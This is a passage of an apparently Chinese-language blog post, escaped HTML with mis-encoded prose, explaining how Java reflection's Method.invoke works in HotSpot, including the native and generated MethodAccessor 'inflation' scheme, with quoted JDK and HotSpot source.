&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">val&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">null&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="n">val&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">equals&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;true&amp;#34;&lt;/span>&lt;span class="o">))&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">noInflation&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">true&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">val&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">System&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getProperty&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;sun.reflect.inflationThreshold&amp;#34;&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">val&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">try&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">inflationThreshold&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Integer&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">parseInt&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">val&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span> &lt;span class="k">catch&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">NumberFormatException&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">throw&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">RuntimeException&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;Unable to parse property sun.reflect.inflationThreshold&amp;#34;&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">initted&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">true&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">});&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>MethodAccessorå®ç°æœ‰ä¸¤ä¸ªç‰ˆæœ¬ï¼Œä¸€ä¸ªæ˜¯Javaç‰ˆæœ¬ï¼Œä¸€ä¸ªæ˜¯nativeç‰ˆæœ¬ ã€‚&lt;/p>
&lt;p>Javaå®ç°çš„ç‰ˆæœ¬åœ¨åˆå§‹åŒ–æ—¶éœ€è¦è¾ƒå¤šæ—¶é—´ï¼Œä½†é•¿ä¹…æ¥è¯´æ€§èƒ½è¾ƒå¥½ï¼›nativeç‰ˆæœ¬æ­£å¥½ç›¸åï¼Œå¯åŠ¨æ—¶ç›¸å¯¹è¾ƒå¿«ï¼Œä½†è¿è¡Œæ—¶é—´é•¿äº†ä¹‹åé€Ÿåº¦å°±æ¯”ä¸è¿‡Javaç‰ˆäº†&lt;/p>
&lt;p>ä¸ºäº†å°½å¯èƒ½åœ°å‡å°‘æ€§èƒ½æŸè€—ï¼ŒHotSpot JDKé‡‡ç”¨â€œinflationâ€çš„æŠ€å·§ï¼šè®©Javaæ–¹æ³•åœ¨è¢«åå°„è°ƒç”¨æ—¶ï¼Œå¼€å¤´è‹¥å¹²æ¬¡ä½¿ç”¨nativeç‰ˆï¼Œç­‰åå°„è°ƒç”¨æ¬¡æ•°è¶…è¿‡é˜ˆå€¼æ—¶åˆ™ç”Ÿæˆä¸€ä¸ªä¸“ç”¨çš„MethodAccessorå®ç°ç±»ï¼Œç”Ÿæˆå…¶ä¸­çš„invoke()æ–¹æ³•çš„å­—èŠ‚ç ï¼Œä»¥åå¯¹è¯¥Javaæ–¹æ³•çš„åå°„è°ƒç”¨å°±ä¼šä½¿ç”¨Javaç‰ˆæœ¬ã€‚ è¿™é¡¹ä¼˜åŒ–æ˜¯ä»JDK 1.4å¼€å§‹çš„ã€‚&lt;/p>
&lt;ol>
&lt;li>
&lt;p>åœ¨JVMå±‚é¢æ¢ç©¶invoke0æ–¹æ³•&lt;/p>
&lt;p>invoke0æ–¹æ³•æ˜¯ä¸€ä¸ªnativeæ–¹æ³•,å®ƒåœ¨HotSpot JVMé‡Œè°ƒç”¨JVM_InvokeMethodå‡½æ•°:&lt;/p>
&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c++" data-lang="c++">&lt;span class="line">&lt;span class="cl">&lt;span class="n">JNIEXPORT&lt;/span> &lt;span class="n">jobject&lt;/span> &lt;span class="n">JNICALL&lt;/span> &lt;span class="nf">Java_sun_reflect_NativeMethodAccessorImpl_invoke0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="n">JNIEnv&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">env&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">jclass&lt;/span> &lt;span class="n">unused&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">jobject&lt;/span> &lt;span class="n">m&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">jobject&lt;/span> &lt;span class="n">obj&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">jobjectArray&lt;/span> &lt;span class="n">args&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">JVM_InvokeMethod&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">env&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">m&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">obj&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">args&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>openjdk/hotspot/src/share/vm/prims/jvm.cpp&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c++" data-lang="c++">&lt;span class="line">&lt;span class="cl">&lt;span class="n">JVM_ENTRY&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">jobject&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">JVM_InvokeMethod&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">JNIEnv&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">env&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">jobject&lt;/span> &lt;span class="n">method&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">jobject&lt;/span> &lt;span class="n">obj&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">jobjectArray&lt;/span> &lt;span class="n">args0&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">JVMWrapper&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;JVM_InvokeMethod&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Handle&lt;/span> &lt;span class="n">method_handle&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kr">thread&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">stack_available&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">address&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">method_handle&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;gt;=&lt;/span> &lt;span class="n">JVMInvokeMethodSlack&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">method_handle&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Handle&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">THREAD&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">JNIHandles&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">resolve&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">method&lt;/span>&lt;span class="p">));&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Handle&lt;/span> &lt;span class="nf">receiver&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">THREAD&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">JNIHandles&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">resolve&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">obj&lt;/span>&lt;span class="p">));&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">objArrayHandle&lt;/span> &lt;span class="nf">args&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">THREAD&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">objArrayOop&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">JNIHandles&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">resolve&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">args0&lt;/span>&lt;span class="p">)));&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">oop&lt;/span> &lt;span class="n">result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Reflection&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">invoke_method&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">method_handle&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="n">receiver&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">args&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">CHECK_NULL&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">jobject&lt;/span> &lt;span class="n">res&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">JNIHandles&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">make_local&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">env&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">result&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">JvmtiExport&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">should_post_vm_object_alloc&lt;/span>&lt;span class="p">())&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">oop&lt;/span> &lt;span class="n">ret_type&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">java_lang_reflect_Method&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">return_type&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">method_handle&lt;/span>&lt;span class="p">());&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">assert&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ret_type&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;sanity check: ret_type oop must not be NULL!&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">java_lang_Class&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">is_primitive&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ret_type&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Only for primitive type vm allocates memory for java object.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// See box() method.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">JvmtiExport&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">post_vm_object_alloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">JavaThread&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">current&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="n">result&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">res&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">THROW_0&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">vmSymbols&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">java_lang_StackOverflowError&lt;/span>&lt;span class="p">());&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">JVM_END&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>openjdk/hotspot/src/share/vm/runtime/reflection.cpp :&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c++" data-lang="c++">&lt;span class="line">&lt;span class="cl">&lt;span class="n">oop&lt;/span> &lt;span class="n">Reflection&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">invoke_method&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">oop&lt;/span> &lt;span class="n">method_mirror&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Handle&lt;/span> &lt;span class="n">receiver&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">objArrayHandle&lt;/span> &lt;span class="n">args&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">TRAPS&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">oop&lt;/span> &lt;span class="n">mirror&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">java_lang_reflect_Method&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">clazz&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">method_mirror&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">slot&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">java_lang_reflect_Method&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">slot&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">method_mirror&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">bool&lt;/span> &lt;span class="k">override&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">java_lang_reflect_Method&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="k">override&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">method_mirror&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">objArrayHandle&lt;/span> &lt;span class="nf">ptypes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">THREAD&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">objArrayOop&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">java_lang_reflect_Method&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">parameter_types&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">method_mirror&lt;/span>&lt;span class="p">)));&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">oop&lt;/span> &lt;span class="n">return_type_mirror&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">java_lang_reflect_Method&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">return_type&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">method_mirror&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">BasicType&lt;/span> &lt;span class="n">rtype&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">java_lang_Class&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">is_primitive&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">return_type_mirror&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">rtype&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">basic_type_mirror_to_basic_type&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">return_type_mirror&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">CHECK_NULL&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">rtype&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">T_OBJECT&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">instanceKlassHandle&lt;/span> &lt;span class="nf">klass&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">THREAD&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">java_lang_Class&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">as_Klass&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">mirror&lt;/span>&lt;span class="p">));&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Method&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">m&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">klass&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">method_with_idnum&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">slot&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">m&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">THROW_MSG_0&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">vmSymbols&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">java_lang_InternalError&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="s">&amp;#34;invoke&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">methodHandle&lt;/span> &lt;span class="nf">method&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">THREAD&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">m&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nf">invoke&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">klass&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">method&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">receiver&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">override&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ptypes&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">rtype&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">args&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">true&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">THREAD&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ol>
&lt;li>
&lt;p>Javaç‰ˆçš„å®ç°&lt;/p>
&lt;p>Javaç‰ˆMethodAccessorçš„ç”Ÿæˆä½¿ç”¨MethodAccessorGeneratorå®ç° ä¸‹é¢æ˜¯å¼€å¤´çš„æ³¨é‡Šï¼š&lt;/p>
&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="cm">/** Generator for sun.reflect.MethodAccessor and
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> sun.reflect.ConstructorAccessor objects using bytecodes to
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> implement reflection. A java.lang.reflect.Method or
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> java.lang.reflect.Constructor object can delegate its invoke or
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> newInstance method to an accessor using native code or to one
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> generated by this class. (Methods and Constructors were merged
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> together in this class to ensure maximum code sharing.) */&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
